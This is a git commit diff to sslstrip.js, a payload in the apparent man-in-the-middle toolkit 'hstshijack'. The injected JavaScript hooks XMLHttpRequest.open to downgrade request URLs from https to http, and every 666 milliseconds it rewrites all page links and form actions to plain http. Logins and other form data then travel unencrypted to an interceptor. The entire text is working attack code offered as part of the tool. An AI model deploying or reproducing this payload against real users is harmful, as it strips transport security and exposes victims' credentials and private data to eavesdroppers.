cb13f10740d3cfab1fb01d330fbb8552b1976ec9
yungtravla <lilprismontour@gmail.com>
2019-01-05 13:43:29 +1000

    fix XMLHttpRequest sslstripping

--- hstshijack/payloads/sslstrip.js
+++ hstshijack/payloads/sslstrip.js
@@ -1,11 +1,19 @@
-XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
-XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
-	obf_var_url = obf_var_url.replace(/^(http)s/ig, "$1")
-	XMLHttpRequest.prototype.obf_open(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password)
-}
+(function() {
+	var obf_open = XMLHttpRequest.prototype.open;
+	XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
+		obf_var_url = obf_var_url.replace(/(http)s/ig, "$1");
+		return obf_open.apply(this, arguments);
+	}
+})();
 
 setInterval(function(){
-	document.querySelectorAll("a, form").forEach(function(obf_var_node){
-		obf_var_node.tagName == "A" ? obf_var_node.href = obf_var_node.href.replace(/^(http)s/ig, "$1") : obf_var_node.action = obf_var_node.action.replace(/^(http)s/ig, "$1")
-	})
-}, 666)
+	try {
+		document.querySelectorAll("a, form").forEach(function(obf_var_node){
+			if (obf_var_node.tagName == "A") {
+				obf_var_node.href = obf_var_node.href.replace(/https/ig, "http");
+			} else {
+				obf_var_node.action = obf_var_node.action.replace(/https/ig, "http");
+			}
+		});
+	} catch(ignore){}
+}, 666);
